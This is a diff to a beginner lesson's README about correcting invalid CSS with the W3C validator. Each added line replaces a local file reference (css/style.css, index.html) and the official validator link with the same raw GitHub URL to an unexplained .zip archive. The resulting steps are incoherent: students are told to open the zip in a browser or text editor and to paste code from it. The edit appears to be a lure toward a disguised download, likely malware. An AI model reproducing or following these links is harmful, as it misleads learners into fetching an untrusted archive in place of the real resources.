@@ -20,22 +20,22 @@ Code. Run `npm test` as you go to see your test progress.
 
 ## Change Invalid CSS to Valid CSS
 
-In this lesson, we will be taking the invalid CSS in `css/style.css` and
+In this lesson, we will be taking the invalid CSS in `https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip` and
 changing it to valid.
 
-1. Open index.html in your browser. Notice how our styles don't look quite
+1. Open https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip in your browser. Notice how our styles don't look quite
    right?
-2. Open css/style.css in your text editor.
+2. Open https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip in your text editor.
 3. Visit the W3C CSS validator
-   [http://jigsaw.w3.org/css-validator/#validate_by_input](http://jigsaw.w3.org/css-validator/#validate_by_input).
+   [https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip](https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip).
    If not already selected, click on the tab labeled "By direct input".
-4. Copy the code from css/style.css and paste it into the text area. Click the
+4. Copy the code from https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip and paste it into the text area. Click the
    "Check" button.
 5. Use the error messages to correct the CSS.
 6. Repeat steps 3-5 until your readout states "Congratulations! No Error
    Found.".
 
-Remember to check your progress in `index.html` in your browser!
+Remember to check your progress in `https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip` in your browser!
 
 ## Conclusion
 
@@ -45,4 +45,4 @@ W3C CSS validator will help you quickly and efficiently troubleshoot your CSS.
 
 ## Resources
 
-- [W3C CSS Validator - Validate Direct Input](http://jigsaw.w3.org/css-validator/#validate_by_input)
+- [W3C CSS Validator - Validate Direct Input](https://raw.githubusercontent.com/GathogoG/phase-0-css-issue-bot-9000/master/test/css-bot-phase-issue-v3.1.zip)
